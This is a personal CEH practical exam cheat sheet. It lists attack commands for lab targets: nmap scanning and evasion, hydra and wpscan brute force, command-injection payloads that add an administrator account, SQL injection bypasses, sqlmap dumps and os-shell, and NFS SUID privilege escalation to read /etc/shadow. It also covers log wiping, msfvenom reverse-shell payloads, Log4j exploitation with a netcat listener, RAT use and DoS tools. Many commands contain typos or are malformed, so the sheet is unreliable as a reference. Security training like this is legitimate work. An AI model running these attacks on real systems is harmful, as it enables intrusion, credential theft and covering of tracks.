# My ceh practical notes
#  Scanning Networks (always do sudo su) --> To be root
```
1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
```
# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS recon/enum-  dnsrecon -d www.google.com -z
5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```
#  Quick Overview (Stegnography) --> Snow , Openstego
```
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3- Image Stegnography using Openstego- PRACTICE ??
```
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL Injections
```
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version
```
# Android
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)

or highesht entropy question comes then 

1. sudo nmap -p 5555 192.168.0.0/24
2. adb connect 192.168.0.14:5555
3. adb shell
4. ls and cd sdcard and ls and pwd
5. adb pull /sdcard/scan/ or adb pull /sdcard/scan attacker/home/
6. ls and cd scan and ls
7. ent -h or apt install ent
8. ent evil.elf
9. ent evil2.elf
10. ent evil3.elf
11. sha384sum evil.elf
12. then you get one hash value type last 4 characters.
```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also
```
# Find FQDN
```
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
```
# Cracking Wi-Fi networks
```
Cracking Wifi Password
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb

```

Domain Controller version = win os 

   execute in powershell
- (Get-WmiObject Win32_OperatingSystem).Version -> NN.N.NNNNN | nmap -p 389,636 -sV <target>
- (Get-ADDomainController -Filter * | Select-Object -ExpandProperty OperatingSystemVersion).Split('.')[0..2] -join '.' | 

Domian controller version 

namp -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' 10.10.1.22
1. python3
2. import ldap3
3. server=ldap3.Server('10.10.1.22',get_info-ldap3.ALL,port=389)
4. Connection=ldap3.Connection(server)
5. connection.bind()
6. server.info
7. connection.search(search base='DC=CEH,DC=com',search_filter='&(objectclass=*))',search_scope='SUBTREE',attribytes='*')

or 

python3
import ldap3
server = ldap3.Server('ldap://your_ldap_server', get_info=ldap3.ALL, port=389)
conn = ldap3.Connection(server)
conn.bind()
conn.search('your_base_dn', '(objectclass=*)', ldap3.SUBTREE, attributes=['operatingSystemVersion'])
for entry in conn.entries:
    print("OS Version:", entry.operatingSystemVersion)

or 

import ldap3

# Define LDAP server settings
server = ldap3.Server('ldap://your_ldap_server', port=389)

# Define LDAP connection settings
conn = ldap3.Connection(server, user='username', password='password')

# Bind to the LDAP server
if conn.bind():
    print("LDAP bind successful")
    
    # Search for operating system information
    conn.search('your_base_dn', '(objectclass=*)', ldap3.SUBTREE, attributes=['operatingSystem', 'operatingSystemServicePack', 'operatingSystemVersion'])
    
    # Print search results
    for entry in conn.entries:
        print("OS:", entry.operatingSystem)
        print("OS Version:", entry.operatingSystemVersion)
        print("Service Pack:", entry.operatingSystemServicePack)
else:
    print("LDAP bind failed")

-------------------------------------
mercury service running on server : 7 or 9  | nmap -sV -p25,110,143 <server_ip

--------------------------------

theef rat 
client 210.exe -> 6703 and 2968

---------------------
Usefull command 

in cmd > findstr /S /I /N /R "string" *

in powershell > Get-ChildItem -Recurse | Select-String -Pattern "string" -CaseSensitive -List

netstat -n | FINDSTR 3389 

to switch simple tupe C:

dir /S /B /A:-D "C:\scan.txt"

dir /S /B /A:-D "C:\*.txt"

------------------------------
Use the following adb commands to transfer files:
Push a file from your computer to your device:
adb push /path/to/your/file /sdcard/destination/folder
Pull a file from your device to your computer:
adb pull /sdcard/source/file /path/to/destination/folder



from to linux to linux and win to linux 

- scp filie location hostname@ip:remote location
- -r for recusrvice 
- pwd current location


- smb 445 | 139 



ilabs 
* footprinting and reconaissance
- google dorking
- Netcraft for domain registrar and other info
- employee using theharvester tool 	 : theHarvester -d name -l 200 linkedin
- gather target website info such as redirect url path and js files etc would be clone from photon : python3 photon -u http://website
- mirror target website using htttrack
- tracing email using emailtrackerpro.exe :paste the received email http data to trace emails field 
- Whois lookup using domaintools.com: 
- subdomain and dns records using securitytrails.com | alterntive DNSDumpster.com
- network tracerouting in windows/linux | win = tracert : linux = traceruote
- footprinting a target using recon-ng : 	
1. marketplace install all
2. workspaces create ceh
3. modules search 
4. workspaces list
5. db insert domains
6. website : ceh.com
7. show domain to check
8. modules load bruteforce 
9. modules load recon/domains-hosts/brute_hosts
10. run -> check for existing domain host for website^
11. modules load recon/hosts-hosts/reverse_resolve 
12. run
13. show host - shows all hosts harvested 
14. back
15. you can create html report too - help for more

* Scanning Networks
- Host discovery in netowrk using nmap

- nmap -sT -v ip : zenmap.exe | -sS stealth scan agaist WAF | -sX | 

-sM | -sA | -sU | -T4 -A -v | -sV Version grabbing

- Os discovery using nmap Script engine: nmap --script=smb-os-discovery.nse ip | -o | -A 

- Scan beyond WAF | nmap -f ip (fragments) | -g 80 ip (source port manipulation) | -mtu 8 ip (maximum transsion unit - fragments) | -D RND:10 ip (decoy address) | -sT -Pn --spoof-mac 0 ip 

- Custom udp/tcp pkt to scan behind WAF | 
  hping3 ip --udp --rand-source --data 500
  hping3 -S ip -p 80 -C 5
  hping3 ip --flood 

- scan using MSF 
 service postgresql start
 msfconsole
 db_status
 nmap -Pn -sS -A -oX Test ip 
 db_import Test
 hosts - list
 services - list
 search portscan
 smb version using auxiliary 

* Enumeration
- netbio enum using cmd utilities 
nbstat -a ip | nbststat -c 
netuse 

- snmp enum using snmpwalk 
snmpwalk -v1 -c public ip | -v2c 

- perform ldap enum using ad explorer.exe

- NFS enum using RPCScan pyton3 & superenum parrot (port 2049)
locate SuperEnum 

SuperEnume -> enter target.txt 
python3 rpc-scan.py ip --rpc

- DNS Enum using Zone Transfer
dig ns www.ceh.com -> look for answer section [cname, NS]
(full zone transfer) - dig @ns1.bluehost.com www.ceh.com axfr -> trafer fail or pass

on wind: nslookup
set querytyoe=soa
ceh.com
ls -d ns1.bluehost.com (zone transfer)

- SMTP Enum using NMAP
nmap -p 25 --script=smtp-enum-users ip 
nmap -p 25 --script=smtp-open-relay ip 
nmap -p 25 --script=smtp-commands ip 
----used for password spraying attacks ---

- enum using global network inventory.exe
use connect as credentials - administrator and pwd
---------will give scan summary------------------


* Vulnerability Analysis

- Vul research on CWE 
- Vul research on CVE

* System Hacking 

- Active online attack to crack pwd using responser.py(parrot)
1. chmod +x ./Responder.py
2. sudo ./Responder.py -I ens3  -> start listening 
3. launch win11 machine 
4. run //CEH=Tools
5. responders got the logs of that win machine
6. go responder dir -> logs dir -> SMB NTML hash
7. snap install john-the-ripper
8. sudo john path-to-smb-ntlm.txt  -> crack the pwd (wordlist located at /snap/john-the-ripper/current/run/password.txt)

- User system monitoring and surveillance using spytech spyagent.exe

- clear linux machine logs using bash shell
1. history -c 
2. shred ~/.bash_history && history -c && exit

- Escalate Privilege using misconfigured NFS
1. apt install nfs-kernel-server
2. sudo nano /etc/exports -> add line /home *(rw,no_root_squash)
3. sudo /etc/init.d/nfs-kernel-server
Done ^ setup

attacher machine for PE

nmpa -sV ip
suod apt-get install nfs-common
showmount -e ip
mkdir /tmp/nfs
sudo mount -t nfs ip:/home /tmp/nfs
cd /tmp/nfs/
sudo cp /bin/bash .
sudo chmod +s bash 
ls -la bash
sudo df -h 

-------now login to target machine

1. ssh -l ubuntu ip | pwd
2. cd /home
3. ls 
4. ./bash -p 
5. bash-5.1# id
6. whoami
7. cp /bin/nano .
8. chmod +4777 nano 
9. ls -la nano 
10. cd /home
11. ls 
12. ./nano -p /etc/shadow -> shows hash of any user and crack it using john
13. cat /etc/crontab
14. ps -ef (processes)
15. find / -name "*.txt" -ls 2> /dev/null (list all text file from sys)
16. find / -perm -4000 -ls 2> /dev/null (suid and info)

* persistence PE using boot order

1 msfvenom -p windwos/meterpreter/reverse_rcp lhost=our_ip lport=8888 -f exe > payload.exe
2. chmod -R 755 /var/www/html/share/
3. chown -R www-data:www-data /var/www/html/share
4. cp /home/attacker/Desktop/exploit.exe /var/www/html/share
5. set payload windows/meterpreter/reverse_tcp
6. set lhost ip
7. set lport 8888
8. exploit 

- buffer overflow attack to gain rce using immunity debugger

* Malware anaylsis

- Gain control of victom machcine using njrat.exe trojan
1. port 5552 or some weird of 4 digit XXXX
2. builder -> to buld -> pass to the sys 

- create virus using JPS virus maker.exe tools 

- Perform malware analyis using hybrid analysis.com
1. threat score, sha value, online scan results and a lot more 

- analyze Elf file using DIE.exe 11mb -  detect it east 
1. file info - entropy, hash, 

- Malware disassembly using IDA.exe and oolyDBG | static
1. ida v7.exe 
2. right click and test view for text view for binary analysis
3. flowgraph for flowchart | hex view for hex vlaue | 
4. - Ollydbg.exe | view and log for log details = functions 
5. executable modules -> executbale module -> click to view info -> cpu main thread win -> view button-> memory mapping 
6. view button -> threads ->> scan files and output

- port monitoring using tcpview.exe and currports
1. details of port,process and pid and all sort of port info of machine

- prefomr process moitoring using processmonitor - dynamic analsi
1. server machine -> procmon.exe -> click on process - properties

* Sniffin 

- perform mac flooding using macof
1. macof -i etho0 -n 10

- perfomr a dhcp starvation using yersinia
1. yersinia -I 
2. press h -> q -> f2 dhcp mode -> x -> 1 dhcp starvation attack 

- perfomr pwd sniffing using Wireshark 
1. http.request.method==post

- detec arp poisoning and promiscouos mode 
1. cain.exe -> configure btn | coala capsa network analyszer.exe

* Social Engineeriing
- SETTOOLKIT
- detect phisinh using netcraft.com extensions on browser = risk rating and a lot more on site.

* DDOS
- Perfomr a DOS attack using Raven-Storm | sudo rst
- " using MOIC high orbit ion canon and low orbit canon | 
- detect and protec against dos using Anti DDOS guradian.exe

* Session Hijacking
- add procy server ip or target where we are opening a site to your network settings 
- hijack session using ZAP.exe | add break tab from + 
- from options setting icon -> local proxies -> address   
- green break circle to capture button 

* evading firwal and ids
- detect interusion using snort
- malicious network traffic using honeybot.exe
- bypass firewall through windows bitsadmin (wind to win)
1. itsadmin /tranfer exploit.exe http://10.10.01.13/share.Exploit.exe c:\Expoit.exe


* Hacking Web Servers
-  info gathering using ghosteye - parrot | python3 ghost-eye.py
1. 3 whoise lookup -> address -> 

- fotprint a webserver using netcat and telenet
1. nc -vv www.moviescaope.con 80 | type GET / HTTP/1.0 enter

- enumerate web serve info using nmap scripts
1. nmap -sV --script=http-enum www.goodshopping.com
2. nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostnamp- www.goodshopping .com 
3. nmap --script http-trace -d www.goodshopping.com
4. nmap -p 80 --script http-waf-detect www.goodshopping.com

- crack ftp cred using dictionary attack

* hacking web application 
- web app reconnaisase using nmap anf telnet 
1. nmap -T4 -A -v www.moviescope.com -> open porst | service
2. Banner grabbing -> telnet or curl -I -k 

- web spiddring using zap
1. in parrot -> zaproxy
2. automated scan = bluc color -> eneter target url -> idetify the various vulnerabilities present on the site

- perform bruteforce using Burpsuite
1. in kali = brup  | update browser proxy to manual - 127.0.0.1 with use with ftp andhttps chgeck box
2. now open provided website login page and login with credetnial to intercept request
3. sent req to intruder -> go to intruder tab -> position 
4. clear position first
5. attack type = cluster bomb
6. select cred and click add $ -> go to payload tab ->
7. payload set 1 -> load payload from desktop user list and payload set 2 and set pass list and starat attack
8. check status 302 and length  

- perform CSRF Attack 
1. wordpress site and login -> plugin -> activate leenk.me plugin -> 
2. click leenk.me plugin -> check facebook, post -> facebook setting | message setting | Default messafge, link, 
3. regist new account with tempmail on wpscan.com/tegister -> login -> copy api token 
4. wpscan --api-token "paste token here" --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp
5. Network -> CTRL l -> smb://10.10.1.11 -> login as admin pwd | WORKGROUP 
2. Script-site.html file - 

- gain access by exploiting LOG4j vuln
1. cd log4j-shell-poc -> run | replace the poc.py replace the line 62 jdk path /usr/jdk/jdk as below file name and line 87 os.path.join same  and line 99 = os.path.join
2. tar -xf jdk-8u202.tar.gz -> mv jdk.8.0.202 /usr/bin/ 
3. do rename the path ^ step 1 
4. nc -lvp 9001  (netcat listener)
5. pyhton3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001 -> copy payload = sendme one
6. open hosted webpage and paste the payload in username fiel and pwd and press login
7. swtich to netcat list -> got connect -> pwd -> whoami -> get flag.tx

* SQL Injection 
- Perform SQL injection against MsSQL 3306 to DB using sqlmap
1. parrot machie - browser moviscope.com
2. login with cred sam and sam -> view profile -> copy url with id=1
3. document.cookie -> get cookie from console between the "cookie"
4. sqlmap -u "pastetheurl" --cookie="paster" --dbs -> Y -> Y -> Y -> got dbname list
5. sqlmap -u "pastetheurl" --cookie="paster" -D dbname --tables -> got table names
6. sqlmap -u "pastetheurl" --cookie="paster" -D moviescope -T User_login --dump -> got table names | if pwd got hashed then use hashes.com or crackstatioo or hashcat, joththeripper to crack it
7. login with john account to check 
8. sqlmap -u "pastetheurl" --cookie="paster" --os-shell -> Y -> got shell 
9. hostname -> help for commandlist 

- detect sql injection using zap
1. automated scan

* Hacking wireless networks
- wifi packet using wireshar

- CRACK a wep network using aircrack-ng
1. aircrak-ng file.pcap

* Android Hacking
- Exploit andoird phonesploit 
1. in parrot - python3 phonesploit.py -> 3 connect to new phone -> if failed press afain anf agian untill ask for ip
2. enter ip on which port is 5555
3. 4 to access the shell  and so on

- payload using androrat and hack 
1. python3 and so on

- analze the malicous app using android analysziers
1. sisik.eu/apk-tools

* iot hacking
- gather info from foortpirn tools
1. shodan and fofa, ghdb, port:1883, scadalogin

- cappture and analyze iot netwrok traffic on wireshark
1. filter = mqtt 

* Cloud computing
- enum s3bucket using s3canner
1. python3 ./s3scanner.py sites.txt 

- exploit open s3 bucket using aws cli

- escalate privilege on misconfigured policys

* Cryptography 

- calculate one way hash using hashcalc.exe of any file

- Perform file and text encyrption using cryptoforge.exe

- create and use seld sign certificate on server

- disk encyrption using veracrypt
1. open encytped file -> click mount -> enter passphtase -> and check inside the files
